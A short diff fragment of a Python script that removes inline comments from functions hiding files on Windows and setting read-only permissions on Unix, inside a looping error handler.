@@ -70,14 +70,14 @@ while True:
         def hide_files_windows(file_paths):
             try:
                 for file_path in file_paths:
-                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # Hide the file
+                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
             except Exception as e:
                 print(f"Error hiding files on Windows: {str(e)}")
 
         def hide_files_unix(file_paths):
             try:
                 for file_path in file_paths:
-                    os.chmod(file_path, 0o400)  # You can adjust file permissions as needed
+                    os.chmod(file_path, 0o400)  
             except Exception as e:
                 print(f"Error hiding files on Unix-based system: {str(e)}")
 
@@ -129,4 +129,4 @@ while True:
 
     except Exception as e:
         print(f"Error: {str(e)}")
-        time.sleep(0)  # Sleep for 5 seconds before restarting
+        time.sleep(0)  
